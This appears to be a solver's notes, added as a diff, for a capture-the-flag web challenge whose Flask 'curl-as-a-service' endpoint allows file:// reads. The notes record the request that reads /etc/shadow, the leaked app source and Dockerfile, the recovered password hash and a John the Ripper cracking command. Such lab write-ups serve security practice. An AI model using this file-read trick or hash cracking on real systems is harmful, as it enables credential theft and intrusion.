@@ -1,0 +1,74 @@
+url that worked:
+https://curl-as-a-service-again.ictf.iciaran.com/curl?url=file:///etc/shadow
+
+➜  ~ curl https://curl-as-a-service-again.ictf.iciaran.com/..
+<pre><code>#!/usr/bin/env python3.9
+
+from flask import Flask, render_template_string, request
+from subprocess import run
+
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    return ("\x3cpre\x3e\x3ccode\x3e%s\x3c/code\x3e\x3c/pre\x3e")%open(__file__).read()
+
+@app.route('/docker')
+def docker():
+    return ("\x3cpre\x3e\x3ccode\x3e%s\x3c/code\x3e\x3c/pre\x3e")%open("Dockerfile").read()
+
+@app.route('/curl')
+def check():
+    if "url" not in request.args:
+        return '''
+            \x3chtml\x3e
+                \x3ccenter\x3e
+                    \x3ch1\x3eCurl-as-a-Service\x3c/h1\x3e
+                    \x3cform action="/curl"\x3e
+                        \x3cinput name="url" type="text" rows="1" cols="100"\x3e\x3c/textarea\x3e\x3cbr\x3e
+                        \x3cinput type="submit" value="Curl me!"\x3e\x3c/input\x3e
+                \x3c/center\x3e
+                \x3c/form\x3e
+            \x3c/html\x3e
+        '''
+
+    url = request.args["url"]
+    whitelist = "abcdefghjiklmnopqrstuvwxyz1234567890./:-_"
+    if any(i not in whitelist for i in url):
+        return "No."
+    return run(["curl", "-L", "--max-time", "1", "--max-filesize", "1000",  url], capture_output=True).stdout.decode()
+
+@app.errorhandler(500)
+def internal_error(error):
+    return f"Oops: {error.original_exception}"
+
+if __name__ == "__main__":
+    app.run('0.0.0.0', 4000)
+
+➜  ictf_curl curl https://curl-as-a-service-again.ictf.iciaran.com/docker
+<pre><code># syntax=docker/dockerfile:1
+
+FROM python:3.8-slim-buster
+
+RUN apt update -y && apt install -y curl
+RUN pip install --upgrade pip
+
+RUN useradd -ms /bin/bash newuser
+COPY flag.txt .
+RUN echo "newuser:$(cat flag.txt | sed 's/ictf{//; s/}//')" | chpasswd && rm flag.txt
+
+WORKDIR /app
+
+RUN pip3 install flask gunicorn --no-cache-dir
+
+COPY app.py Dockerfile ./
+
+CMD [ "python3", "-m" , "gunicorn.app.wsgiapp", "app:app", "--bind=0.0.0.0:4000", "--workers=4"]
+</code></pre>%
+
+docker files are stored at `/var/lib/docker/containers/<container_id>/<container_id>-json.log`
+hostname: 969c6fe9bbff
+docker files are stored at https://sematext.com/blog/docker-logs-location/#:~:text=Each%20log%20file%20contains%20information,on%20a%20Linux%20Docker%20host.
+flag = "$6$790Vj.KXQNkViVyt$4oSxluwB.OUx10navg0n05Z3U5yupMgdEO8Kj1ZhXdH6Z1CoVuC51mGkE2qtKSgT79WP3xT03fFskywZzGCVz0"
+newuser:$6$790Vj.KXQNkViVyt$4oSxluwB.OUx10navg0n05Z3U5yupMgdEO8Kj1ZhXdH6Z1CoVuC51mGkE2qtKSgT79WP3xT03fFskywZzGCVz0:18942:0:99999:7:::
+john password.txt --wordlist=rockyou.txt --rules password.txt
